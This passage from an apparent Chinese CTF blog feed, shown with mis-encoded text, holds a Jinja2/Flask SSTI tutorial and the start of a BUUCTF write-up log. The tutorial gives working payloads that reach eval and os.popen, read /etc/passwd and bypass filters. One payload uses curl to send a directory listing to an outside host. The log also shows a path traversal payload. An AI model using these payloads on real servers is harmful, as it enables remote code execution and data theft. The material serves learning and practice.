}:è£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥</li><li>:è£…è½½ä¸€ä¸ªæ³¨é‡Š</li></ul><p><strong>æµç¨‹ï¼š</strong></p><ol><li><p>â€‹    è·å–åŸºæœ¬ç±»</p></li><li><p>â€‹    è·å–åŸºæœ¬ç±»çš„å­ç±»</p></li><li><p>â€‹    æ‰¾åˆ°é‡è½½è¿‡çš„<code>__init__</code>ç±»</p></li><li><p>â€‹    æŸ¥çœ‹å…¶å¼•ç”¨<code>__builtins__</code></p></li><li><p>â€‹    è°ƒç”¨å…¶ä¸­å¯ç”¨çš„å‡½æ•°</p></li></ol><p><strong>è·å–åŸºæœ¬ç±»</strong></p><p>â€‹        åˆ©ç”¨<code>__bases__</code>æˆ–è€…æ˜¯<code>__mro__</code>å‡½æ•°</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;é’ˆå¯¹jinjia2&#x2F;flaskä¸º[9]é€‚ç”¨</code></pre><p>//å®è¯å®è¯´æœ€åä¸€ä¸ªä¸æ˜¯å¾ˆæ‡‚</p><p><strong>è·å–åŸºç±»çš„å­ç±»</strong></p><p>â€‹    åˆ©ç”¨<code>__subclasses__</code>å‡½æ•°</p><pre class="language-python" data-language="python"><code class="language-python">object.__subclasses__()&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;è¿™å¥å¯ä»¥æŸ¥æ‰¾æ‰€æœ‰çš„ç±»</code></pre><p>SSTIçš„ä¸»è¦ç›®çš„å°±æ˜¯ä»è¿™ä¹ˆå¤šå­ç±»ä¸­æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„ç±»ï¼ˆä¸€èˆ¬æ˜¯æŒ‡è¯»å†™æ–‡ä»¶çš„ç±»ï¼‰åŠ ä»¥åˆ©ç”¨</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•æœ‰&lt;type &#39;file&#39;&gt;ç­‰ï¼Œï¼ˆä¸€èˆ¬fileåœ¨ç¬¬40å·ï¼‰</p><p><strong>æ‰¾åˆ°é‡è½½è¿‡çš„<code>__init__</code>ç±»</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__        &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)å¯ä»¥æŸ¥çœ‹å½“å‰ä½ç½®ï¼Œ</code></pre><p> <strong>æŸ¥çœ‹å…¶å¼•ç”¨<code>__builtins__</code></strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p><strong>ä½¿ç”¨osæ¨¡å—æ‰§è¡Œå‘½ä»¤æ¥è¯»å–flagæˆ–è€…æ‰§è¡Œå‘½ä»¤</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;</code></pre><p><strong>æ¥ã€å§¿åŠ¿</strong></p><p><strong>1ã€config</strong></p><p><code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥è·å–å½“å‰</p><p><code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥è·å–å½“å‰è®¾ç½®ï¼Œå¦‚æœé¢˜ç›®ç±»ä¼¼<code>app.config [&#39;FLAG&#39;] = os.environ.popï¼ˆ&#39;FLAG&#39;ï¼‰</code>ï¼Œé‚£å¯ä»¥ç›´æ¥è®¿é—®<code>&#123;&#123;config['FLAG']&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;config.FLAG&#125;&#125;</code>å¾—åˆ°flag</p><p><strong>2ã€self</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;self&#125;&#125; â‡’ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; â‡’ åŒæ ·å¯ä»¥æ‰¾åˆ°config</code></pre><p><strong>3ã€&quot;&quot;ã€[]ã€()ç­‰æ•°æ®ç»“æ„</strong></p><p>ä¸»è¦ç›®çš„æ˜¯é…åˆ<code>__class__.__mro__[2]</code>è¿™æ ·æ‰¾åˆ°<code>object</code>ç±»<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p><p><strong>4ã€url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, configç­‰</strong></p><p>å¦‚æœconfigï¼Œselfä¸èƒ½ä½¿ç”¨ï¼Œè¦è·å–é…ç½®ä¿¡æ¯ï¼Œå°±å¿…é¡»ä»å®ƒçš„ä¸Šéƒ¨å…¨å±€å˜é‡ï¼ˆè®¿é—®é…ç½®current_appç­‰ï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</code></pre><p><strong>å¸¸è§çš„è¿‡æ»¤ç»•è¿‡</strong></p><p><strong>(1)åªè¿‡æ»¤<code>[]</code></strong></p><blockquote><p>pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>è‹¥<code>.</code>ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°<code>|attr()</code><br>å°†<code>request.__class__</code>æ”¹æˆ<code>request|attr(&quot;__class__&quot;)</code></p></blockquote><p><strong>(2)è¿‡æ»¤_</strong></p><p>åˆ©ç”¨<code>request.args</code>å±æ€§<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>å°†å…¶ä¸­çš„<code>request.args</code>æ”¹ä¸º<code>request.values</code>åˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</p><p><strong>(3)å…³é”®å­—è¿‡æ»¤</strong></p><ul><li>base64ç¼–ç ç»•è¿‡<br><code>__getattribute__</code>ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³•</li></ul><p>ä¾‹å¦‚è¢«è¿‡æ»¤æ‰<code>__class__</code>å…³é”®è¯<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li></ul><p><strong>(4)è¿‡æ»¤{ {</strong></p><p>ä½¿ç”¨<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>ï¼Œä¾‹å¦‚</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; |  grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125;</code></pre><p>å¦‚æœä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–æ–‡ä»¶å¯ä»¥åˆ©ç”¨ç›²æ³¨çš„æ–¹æ³•é€ä½å°†å†…å®¹çˆ†å‡ºæ¥</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre><p><strong>(5)å¼•å·å†…åå…­è¿›åˆ¶ç»•è¿‡</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&quot;&quot;.__class__&#125;&#125;&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;_&#96;æ˜¯&#96;\x5f&#96;ï¼Œ&#96;.&#96;æ˜¯&#96;\x2E</code></pre><p><strong>(6)&quot; &#39; chrç­‰è¢«è¿‡æ»¤ï¼Œæ— æ³•å¼•å…¥å­—ç¬¦ä¸²</strong></p><ul><li>ç›´æ¥æ‹¼æ¥é”®å</li></ul><pre class="language-python" data-language="python"><code class="language-python">dict(buil&#x3D;aa,tins&#x3D;dd)|join()</code></pre><ul><li>åˆ©ç”¨<code>string</code>ã€<code>pop</code>ã€<code>list</code>ã€<code>slice</code>ã€<code>first</code>ç­‰è¿‡æ»¤å™¨ä»å·²æœ‰å˜é‡é‡Œé¢ç›´æ¥æ‰¾</li></ul><pre class="language-python" data-language="python"><code class="language-python">(app.__doc__|list()).pop(102)|string()</code></pre><ul><li>æ„é€ å‡º<code>%</code>å’Œ<code>c</code>åï¼Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»£æ›¿<code>chr</code></li></ul><pre class="language-python" data-language="python"><code class="language-python">&#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125;      # uld&#x3D;%c&#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125;</code></pre><p><strong>(7)+ç­‰è¢«è¿‡æ»¤ï¼Œæ— æ³•æ‹¼æ¥å­—ç¬¦ä¸²</strong></p><ul><li><code>~</code><br>åœ¨jinjaä¸­å¯ä»¥æ‹¼æ¥å­—ç¬¦ä¸²</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²<br>åŒä¸Š</li></ul><p>ä¾‹ä¸€ï¼š<br>warnings.catch_warningsç±»</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PSï¼šç”±äºä½¿ç”¨[â€˜globalsâ€™]ä¼šé€ æˆ500çš„æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”å½“æˆ‘ç›´æ¥è¾“å…¥search=globalsæ—¶é¡µé¢ä¹Ÿä¼š500ï¼Œè§‰å¾—è¿™é‡Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼[â€˜gloâ€™+&#39;balsâ€™]</p><p>æœ€åè·å–flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>ä¾‹äºŒï¼š</p><pre class="language-python" data-language="python"><code class="language-python">classâ€™site._Printerâ€™ç±»&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>è·å–flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>ä¾‹ä¸‰ï¼š<br>popen</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>æ­äº†ä¸ªé¶åœº</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>å…ˆæ‰¾åŸºæœ¬ç±»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p><p>å†è·å–åŸºæœ¬ç±»çš„å­ç±»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p><p>æ‰¾åˆ°é‡è½½è¿‡çš„<code>__init__</code>ç±»</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p><p>æŸ¥çœ‹å…¶å¼•ç”¨<code>__builtins__</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p><p>åˆ©ç”¨evalå‘½ä»¤æ‰§è¡Œæ¥è¯»å–flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>è¿™ä¸ªè¿‡æ»¤äº†{ { ï¼Œæ‰€ä»¥è¦é‡‡ç”¨{ % % }çš„å½¢å¼</p><p>{ % % }å†…åŠ æ§åˆ¶è¯­å¥</p><p>ä¸”è¿™é‡Œå±•ç¤ºæ•°æ®è¦åˆ©ç”¨{ % print % }</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p><p>è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨æ§åˆ¶è¯­å¥</p><p>å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„å­ç±»å†åˆ©ç”¨WarningMessageçš„<code>__bulitins__</code>æ‰§è¡Œä»£ç è¿™ä¸ªè¿˜ä¸å¤ªæ‡‚å…ˆè´´ä¸€ä¸‹payload</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre><p>è¡¥:</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%ifsub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;</code></pre><p>è¦åˆ©ç”¨&lt;class â€˜warnings.catch_warningsâ€™&gt;æ¥è°ƒç”¨eval osç­‰å‘½ä»¤<br>&lt;class â€˜warnings.catch_warningsâ€™&gt;<br>ä¸€èˆ¬ä½ç½®ä¸º59ï¼Œå¯ä»¥ç”¨å®ƒæ¥è°ƒç”¨fileã€osã€evalã€commandsç­‰</p><p>è°ƒç”¨file</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()      #æŠŠ read() æ”¹ä¸º write() å°±æ˜¯å†™æ–‡ä»¶</code></pre><p>import os</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read()</code></pre><p>è°ƒç”¨eval</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)</code></pre><p>è°ƒç”¨systemæ–¹æ³•ã€‚ï¼ˆä¸åŒ…å«systemï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤systemçš„æƒ…å†µï¼‰</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>åˆ©ç”¨commandsè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125;</code></pre><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>åœ¨å­¦äº†åœ¨å­¦äº†ï¼ˆ</p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>é¢˜ç›®é‡Œæœ‰base64åŠ å¯†ã€è§£å¯†å’Œä¸€ä¸ªæç¤ºé¡µé¢ï¼Œè¯•ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“è§£å¯†æ¡†å­˜åœ¨sstiæ³¨å…¥ï¼Œä¸”å½“æŠ¥é”™æ—¶ä¼šè¿›å…¥debugæ¨¡å¼åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ†æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p><p>è¯•ç€è®¿é—®appã€‚py</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†ä¸€äº›å†…å®¹</p><p>å†æŸ¥æ‰¾ç›®å½•å†…å†…å®¹</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p><p>çœ‹è§ä¸€ä¸ªthis_is_the_flag.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p><p>å°è¯•å»è®¿é—®,å¾—åˆ°flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>ä¹Ÿå¯ä»¥åˆ©ç”¨åˆ‡ç‰‡çš„æ–¹å¼</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
            <tag> sstiæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuåˆ·é¢˜è®°å½•</title>
      <link href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹è‡ªå·±buuçš„åˆ·é¢˜è¿›åº¦ï¼Œç•™ä¸‹ç‚¹wpæ–¹ä¾¿ä»¥åçœ‹</p> <span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404004946660.png" alt="image-20210404004946660"></p><p>è¿›å…¥åçœ‹åˆ°æ»‘ç¨½è¡¨æƒ…ï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°æœ‰source.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404005053754.png" alt="image-20210404005053754"></p><p>çœ‹åˆ°phpä»£ç </p><p>è¦æ±‚ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„fileï¼Œä¸”éœ€æ»¡è¶³class emmmä¸­çš„æ¡ä»¶</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php  highlight_file(__FILE__);  class emmm  &#123;    public static function checkFile(&amp;$page)    &#123;      $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];     åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸”æ˜¯å¦ä¸ºstringç±»å‹      if (! isset($page) || !is_string($page)) &#123;        echo &quot;you can&#39;t see it&quot;;        return false;      &#125;åˆ¤æ–­ä¼ å…¥çš„å‚æ•°ä¸­æ˜¯å¦æœ‰ç™½åå•å†…çš„å†…å®¹      if (in_array($page, $whitelist)) &#123;        return true;      &#125;mb_substr()å‡½æ•°åˆ‡å‰²å‚æ•°ä»0åˆ°ç¬¬mb_strpos()å‡½æ•°è¿”å›çš„æ•°å€¼      $_page &#x3D; mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)      );       åˆ¤æ–­åˆ‡å‰²åçš„å‚æ•°æ˜¯å¦åœ¨ç™½åå•ä¸­      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;   åˆ‡å‰²åçš„å‚æ•°ç»è¿‡urlè§£ç åå†è¿›è¡Œä¸€æ¬¡è¿‡æ»¤      $_page &#x3D; urldecode($page);      $_page &#x3D; mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)      );      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;      echo &quot;you can&#39;t see it&quot;;      return false;    &#125;  &#125;  if (! empty($_REQUEST[&#39;file&#39;])    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])  )      ifå†…ä¸ºçœŸæ—¶è¿›è¡Œæ–‡ä»¶åŒ…å«  &#123;    include $_REQUEST[&#39;file&#39;];    exit;  &#125; else &#123;    echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;  &#125; </code></pre><p>ç”±äºhint.phpä¸­æç¤ºflagåœ¨ffffllllaaaaggggä¸­ä¸”whitelistä¸­ä»…æœ‰source.phpå’Œhint.php</p><p>æ‰€ä»¥ä¼ å…¥</p><p>file=hint.php?ffffllllaaaagggg</p><p>æ— å›æ˜¾</p><p>åå¤šæ¬¡åˆ©ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½•</p><p>æœ€ç»ˆpayloadä¸º</p><p>file=hint.php?/../../../../ffffllllaaaagggg</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404142347332.png" alt="image-20210404142347332"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>è¿›å…¥åçœ‹åˆ°è¿™ä¸ªç•Œé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152133426.png" alt="image-20210410152133426"></p><p>æŸ¥çœ‹æºç å¯ä»¥æ‰¾åˆ°Archive_room.php</p><p><img 